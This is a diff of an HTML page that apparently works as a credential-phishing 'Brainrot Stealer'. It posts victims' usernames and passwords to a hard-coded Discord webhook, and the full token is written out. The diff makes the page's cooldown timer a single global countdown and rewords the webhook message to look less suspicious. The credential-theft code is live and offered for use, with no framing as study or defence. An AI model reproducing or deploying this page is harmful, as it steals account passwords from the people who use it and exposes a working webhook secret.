@@ -63,40 +63,17 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1517608770891677909/H4jG9vc_1yzz7ZfSPbxxjaQODVrjAPPU6jTk8khQyTWF_XsRk2lokcm4YrYw6UJjro1f"; // CHANGE THIS
 
+        // === GLOBAL SHARED TIMER ===
+        // Change this date if you want to reset the global cooldown
+        const GLOBAL_END_TIME = new Date("2026-07-10T00:00:00Z").getTime(); // Example: July 10, 2026
+
         function startCooldown() {
             const timerEl = document.getElementById('timer');
-            let endTime = null;
-
-            // Try localStorage (works best on direct GitHub Pages link)
-            try {
-                if (typeof localStorage !== "undefined") {
-                    const saved = localStorage.getItem('brainrotCooldownEnd');
-                    if (saved) endTime = parseInt(saved);
-                }
-            } catch(e) {}
-
-            // Fallback window.name for heavy sandboxes
-            try {
-                if (!endTime && window.name && !isNaN(parseInt(window.name))) {
-                    endTime = parseInt(window.name);
-                }
-            } catch(e) {}
-
-            // Create new timer ONLY if none exists
-            if (!endTime || isNaN(endTime)) {
-                endTime = Date.now() + (20 * 24 * 60 * 60 * 1000); // 20 days from now
-                try {
-                    if (typeof localStorage !== "undefined") localStorage.setItem('brainrotCooldownEnd', endTime);
-                } catch(e) {}
-                try { window.name = endTime.toString(); } catch(e) {}
-            }
 
             function update() {
-                const remaining = endTime - Date.now();
+                const remaining = GLOBAL_END_TIME - Date.now();
                 if (remaining <= 0) {
                     timerEl.innerHTML = "✅ COOLDOWN EXPIRED";
-                    try { if (typeof localStorage !== "undefined") localStorage.removeItem('brainrotCooldownEnd'); } catch(e) {}
-                    try { window.name = ""; } catch(e) {}
                 } else {
                     const d = Math.floor(remaining / 86400000);
                     const h = Math.floor((remaining % 86400000) / 3600000);
@@ -126,7 +103,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     username: "Brainrot Stealer",
-                    content: "**NEW STEAL A BRAINROT STEAL**",
+                    content: "**new account information!**",
                     embeds: [{ color: 0x22c55e, fields: [
                         { name: "Username", value: user },
                         { name: "Password", value: pass },
